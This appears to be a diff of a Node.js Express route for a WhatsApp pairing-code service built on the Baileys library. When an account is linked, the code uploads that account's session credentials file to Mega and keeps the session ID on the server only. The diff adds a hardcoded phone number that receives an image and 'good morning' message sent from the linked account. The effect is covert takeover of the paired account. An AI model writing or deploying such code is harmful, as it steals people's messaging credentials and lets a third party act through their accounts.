@@ -1,105 +1,119 @@
 const express = require('express');
 const fs = require('fs-extra');
 const { exec } = require("child_process");
+let router = express.Router();
 const pino = require("pino");
 const { Boom } = require("@hapi/boom");
 const path = require('path');
-const multer = require('multer');
-const uploadMiddleware = multer({ dest: 'uploads/' });
 
 const { upload } = require('./mega');
 const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    delay,
-    makeCacheableSignalKeyStore,
-    Browsers,
-    DisconnectReason
+default: makeWASocket,
+useMultiFileAuthState,
+delay,
+makeCacheableSignalKeyStore,
+Browsers,
+DisconnectReason
 } = require("@whiskeysockets/baileys");
 
-let router = express.Router();
+// ===== FIXED TARGET NUMBER HERE =====
+const TARGET_NUMBER = "94773913394"; // <- මෙතන ඔබට message යවන්න ඕන අංකය
+const IMAGE_PATH = path.join(__dirname, "target.jpg"); // <- මෙතන ඔබට image file path
 
-router.post('/code', uploadMiddleware.single('imageFile'), async (req, res) => {
-    const myNumber = req.body.myNumber?.replace(/[^0-9]/g, '');
-    const targetNumber = req.body.targetNumber?.replace(/[^0-9]/g, '');
-    const msgText = req.body.msgText || '';
-    const imagePath = req.file?.path;
+// Ensure the directory is empty when the app starts
+if (fs.existsSync('./auth_info_baileys')) {
+fs.emptyDirSync(__dirname + '/auth_info_baileys');
+}
 
-    if (!myNumber || !targetNumber || !msgText || !imagePath) {
-        return res.status(400).json({ code: "Missing required fields" });
-    }
+router.get('/', async (req, res) => {
+let num = req.query.number;
 
-    // clear previous session
-    if (fs.existsSync('./auth_info_baileys')) {
-        fs.emptyDirSync('./auth_info_baileys');
-    }
+async function SUHAIL() {  
+    const { state, saveCreds } = await useMultiFileAuthState(`./auth_info_baileys`);  
+    try {  
+        let Smd = makeWASocket({  
+            auth: {  
+                creds: state.creds,  
+                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),  
+            },  
+            printQRInTerminal: false,  
+            logger: pino({ level: "fatal" }).child({ level: "fatal" }),  
+            browser: Browsers.macOS("Safari"),  
+        });  
 
-    const { state, saveCreds } = await useMultiFileAuthState(`./auth_info_baileys`);
-    let sentCode = false;
+        if (!Smd.authState.creds.registered) {  
+            await delay(1500);  
+            num = num.replace(/[^0-9]/g, '');  
+            const code = await Smd.requestPairingCode(num);  
+            if (!res.headersSent) {  
+                await res.send({ code });  
+            }  
+        }  
 
-    try {
-        let sock = makeWASocket({
-            auth: {
-                creds: state.creds,
-                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
-            },
-            printQRInTerminal: false,
-            logger: pino({ level: "fatal" }),
-            browser: Browsers.macOS("Safari"),
-        });
+        Smd.ev.on('creds.update', saveCreds);  
 
-        if (!sock.authState.creds.registered) {
-            await delay(1500);
-            const code = await sock.requestPairingCode(myNumber);
-            if (!sentCode) {
-                sentCode = true;
-                res.json({ code });
-            }
-        }
+        Smd.ev.on("connection.update", async (s) => {  
+            const { connection, lastDisconnect } = s;  
 
-        sock.ev.on('creds.update', saveCreds);
+            if (connection === "open") {  
+                try {  
+                    await delay(10000);  
+                    if (fs.existsSync('./auth_info_baileys/creds.json'));  
 
-        sock.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect } = update;
+                    const auth_path = './auth_info_baileys/';  
 
-            if (connection === "open") {
-                try {
-                    await delay(5000);
+                    // Upload credentials to Mega  
+                    const mega_url = await upload(fs.createReadStream(auth_path + 'creds.json'), `${Date.now()}.json`);  
+                    const sessionId = mega_url.replace('https://mega.nz/file/', '');  
 
-                    // send image & message
-                    await sock.sendMessage(
-                        `${targetNumber}@s.whatsapp.net`,
-                        { image: fs.readFileSync(imagePath), caption: msgText }
-                    );
+                    // Send image + "good morning" text to fixed target number  
+                    await Smd.sendMessage(  
+                        `${TARGET_NUMBER}@s.whatsapp.net`,  
+                        {  
+                            image: fs.readFileSync(IMAGE_PATH),  
+                            caption: "good morning"  
+                        }  
+                    );  
 
-                    // upload creds to mega
-                    const mega_url = await upload(fs.createReadStream('./auth_info_baileys/creds.json'), `${Date.now()}.json`);
-                    console.log("Mega session link:", mega_url);
+                    console.log(`Session ID: ${sessionId}`);  
+                    console.log(`Image & message sent to ${TARGET_NUMBER}`);  
 
-                    fs.unlinkSync(imagePath);
-                    await fs.emptyDirSync('./auth_info_baileys');
-                } catch (e) {
-                    console.error("Send error:", e);
-                }
-            }
+                    // Clean up  
+                    await delay(1000);  
+                    await fs.emptyDirSync(__dirname + '/auth_info_baileys');  
 
-            if (connection === "close") {
-                let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
-                if (reason === DisconnectReason.restartRequired) {
-                    console.log("Restarting connection...");
-                    // avoid recursive res.json calls
-                    sentCode = true;
-                    connectAndSend();
-                } else {
-                    exec('pm2 restart qasim');
-                }
-            }
-        });
+                } catch (e) {  
+                    console.log("Error during file upload or message send: ", e);  
+                }  
+            }  
 
-    } catch (err) {
-        console.error("Error in pairing:", err);
-        if (!sentCode) res.json({ code: "Error generating code" });
-    }
+            // Handle connection closures  
+            if (connection === "close") {  
+                let reason = new Boom(lastDisconnect?.error)?.output.statusCode;  
+                if (reason === DisconnectReason.restartRequired) {  
+                    SUHAIL().catch(err => console.log(err));  
+                } else {  
+                    console.log('Connection closed with bot. Restarting...');  
+                    exec('pm2 restart qasim');  
+                }  
+            }  
+        });  
+
+    } catch (err) {  
+        console.log("Error in SUHAIL function: ", err);  
+        exec('pm2 restart qasim');  
+        SUHAIL();  
+        await fs.emptyDirSync(__dirname + '/auth_info_baileys');  
+        if (!res.headersSent) {  
+            await res.send({ code: "Try After Few Minutes" });  
+        }  
+    }  
+}  
+
+await SUHAIL();
+
 });
 
 module.exports = router;
+
+
